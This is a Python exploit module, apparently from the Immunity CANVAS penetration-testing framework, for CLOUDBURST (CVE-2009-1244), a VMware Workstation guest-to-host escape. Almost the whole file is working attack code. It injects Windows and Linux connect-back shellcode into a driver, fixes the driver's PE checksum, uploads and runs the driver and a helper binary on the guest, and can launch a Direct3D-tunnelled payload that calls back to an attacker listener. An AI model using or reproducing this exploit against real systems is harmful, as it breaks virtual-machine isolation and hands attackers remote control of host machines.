#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path:
    sys.path.append('.')

import socket
import time
import struct
import base64

from exploitutils import *
from tcpexploit import tcpexploit
from shelllistener import *
from MOSDEF import mosdef
import canvasengine
from engine import CanvasConfig

from ExploitTypes.localexploit import LocalExploit

NAME='CLOUDBURST VMware Workstation Guest Escape'
DESCRIPTION='CLOUDBURST VMware Workstation Guest Escape'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']='VMware'
DOCUMENTATION['Repeatability']='One Shot'
DOCUMENTATION['CVE Name']='CVE-2009-1244'
DOCUMENTATION['CVE Url']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1244'
DOCUMENTATION['CVSS'] = 6.8
DOCUMENTATION['CVS URL']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1244'
DOCUMENTATION['Date public']='04/10/2009'
DOCUMENTATION['Notes']='The exploit currently only supports a Windows Guest in a Windows Host, with "Accelerate 3D Graphics" enabled (default on new 6.5 VMs). mosdefd3d.exe will remain on the Guest until removed. The MOSDEF Over Direct3D tunnel requires the latest DirectX redistributable (March 2009 or later) to be installed on the Guest (d3dx9_40.dll must be present). Linux connect back will freeze the VM for it is not threaded.'

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Local'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP','2003']

NOTES="""
http://lists.vmware.com/pipermail/security-announce/2009/000055.html

As of 01/28/10:
- Driver was compiled with latest DDK (7.0)
- Linux support is for the moment limited to Ubuntu 8.04 LTS (mostly because no NX/ASLR)
- Connect-back capabilities added, if a route between the Host and the attacker (or whichever listener you specified) exists
- Exploit can be launched against a XP/Vista/Ubuntu host OS without prior knowledge, it will start and pick the correct listener
- MOSDEF Over Direct3D still requires a recent DirectX on the VM and a Windows Host, but no connectivity between the Host and the attacker
"""

TODO="""
"""

targets={
    0: ['Connect-back Shellcode'],
    1: ['MOSDEF Over Direct3D Shellcode']
}

import shellcode.standalone.windows.payloads as payloads

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name=NAME
        self.subesp=0
        self.usecheckvm=0

    def getArgs(self):
        self.usecheckvm=int(self.argsDict.get('usecheckvm',self.usecheckvm))

    def run_attack(self,node):
        self.node=node #XXX: not needed?
        ret,nodeos=node.shell.GetVersionEx()
        minor=nodeos['Minor Version']
        major=nodeos['Major Version']
        self.log('Attacking Windows %d.%d'%(major,minor))
        if major!=5:
            self.log('This exploit is only for Windows 2000, Windows XP, Windows Server 2003.')
            return 0
        if self.usecheckvm==1:
            self.log('Checking if we are running inside a VM')
            ret=node.shell.checkvm()
            if not ret:
                self.log('This exploit will only work on VMware Guests. Aborting.')
                return 0

        self.log('Running CLOUDBURST with version %d'%(self.version))

        winList=self.engine.autoListener(self,canvasengine.WIN32MOSDEF)
        winList.argsDict['fromcreatethread']=False
        linList=self.engine.autoListener(self,canvasengine.LINUXMOSDEF)
        if winList==None or linList==None:
            self.log('One or both of the MOSDEF listeners could not be started')
            return 0

        self.log('Replacing shellcodes')
        resources=os.path.join(CanvasConfig['canvas_resources'],'CLOUDBURST')
        f=open(os.path.join(resources,'cloudburst.sys'),'rb')
        driver=f.read()
        f.close()

        if self.version==0:
            #asm=p.callback(winList.ip,winList.port) #Note to self: Do not use an unfinished shellcode to avoid headaches
            self.createWin32Shellcode('',winList.ip,winList.port)
            winSc=self.shellcode
        elif self.version==1:
            p=payloads.payloads()
            asm=p.framebuffer_proxy()
            winSc=p.assemble(asm)
        i=driver.find('DNIW')
        if i==-1:
            self.log('Windows shellcode tag could not be found in cloudburst.sys')
            return 0
        i+=4
        print('Windows shellcode length: %d'%(len(winSc)))
        driver=driver[:i]+winSc+driver[i+len(winSc):]
        linSc=self.createLinuxCallbackShellcode(linList.ip,linList.port,'')
        i=driver.find('UNIL')
        if i==-1:
            self.log('Linux shellcode tag could not be found in cloudburst.sys')
            return 0
        i+=4
        print('Linux shellcode length: %d'%(len(linSc)))
        driver=driver[:i]+linSc+driver[i+len(linSc):]

        self.log('Fixing the checksum of cloudburst.sys')
        offset=struct.unpack('<H',driver[0x3c:0x3e])[0]+0x58 #PEOffset+0x58
        driver=driver[:offset]+struct.pack('<L',0)+driver[offset+4:] #Zero out the checksum field
        cksum=0
        if (len(driver)%0x80)!=0:
            self.log('Size of cloudburst.sys is not a multiple of 0x80. Aborting.')
            return 0
        for i in range(0,len(driver),4):
            cksum+=struct.unpack('<L',driver[i:i+4])[0] #Additive checksum
        cksum=(cksum>>0x10)+(cksum&0xffff)
        cksum+=cksum>>0x10
        cksum&=0xffff
        cksum+=len(driver) #Add the length of the image
        self.log('New cloudburst.sys checksum: %08x'%(cksum))
        driver=driver[:offset]+struct.pack('<L',cksum)+driver[offset+4:]

        remote_path=self.node.shell.getcwd()+'\\'

        self.log('Uploading cloudburst.sys')
        cloudburst_sys=remote_path+'cloudburst.sys'
        ret=self.node.shell.upload(driver,destfilename=cloudburst_sys,sourceisbuffer=True)
        if not ret:
            self.log('Upload of cloudburst.sys failed.')
            return 0

        self.log('Uploading cloudburst.exe')
        cloudburst_exe=remote_path+'cloudburst.exe'
        ret=self.node.shell.upload(os.path.join(resources,'cloudburst.exe'),destfilename=cloudburst_exe)
        if not ret:
            self.log('Upload of cloudburst.exe failed.')
            return 0

        ret=self.node.shell.runcommand('"%s"'%(cloudburst_exe))
        self.log('RunCommand returned "%s"'%(ret))
        if ret.count('Error')>0:
            self.log('CLOUDBURST failed to execute. Check the output of the binary.')
            return 1

        self.log('Removing uploaded file')
        self.node.shell.unlink(cloudburst_exe)
        self.node.shell.unlink(cloudburst_sys)

        if self.version!=0:
            self.log('Uploading mosdefd3d.exe')
            mosdefd3d_exe=remote_path+'mosdefd3d.exe'
            ret=self.node.shell.upload(os.path.join(resources,'mosdefd3d.exe'),destfilename=mosdefd3d_exe)
            if not ret:
                self.log('Upload of mosdefd3d.exe failed.')
                return 0
            self.log('Sleeping 5s')
            time.sleep(5)    
            self.log('Executing: "%s" %s %d'%(mosdefd3d_exe,winList.ip,winList.port))
            ret=self.node.shell.runcommand('"%s" %s %d'%(mosdefd3d_exe,winList.ip,winList.port))
            self.log('RunCommand returned "%s"'%(ret))

        self.log('Exploit done.')
        return 0

    def run(self):
        self.setInfo('%s (in progress)'%(NAME))
        success=0 
        for node in self.argsDict['passednodes']:
            if 'win32api' not in node.capabilities:
                self.log('Node %s not a Win32 node'%(node.getname()))
                continue
            self.getArgs()
            ret=self.run_attack(node)
            if ret==1:
                success=1
        return success

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

    def usage(self):
        print 'Usage: %s -v version -t host -p port\n'%(sys.argv[0])
        self.displayVersions()

if __name__=='__main__':
    print 'This win32 local module is meant to be run only within CANVAS'
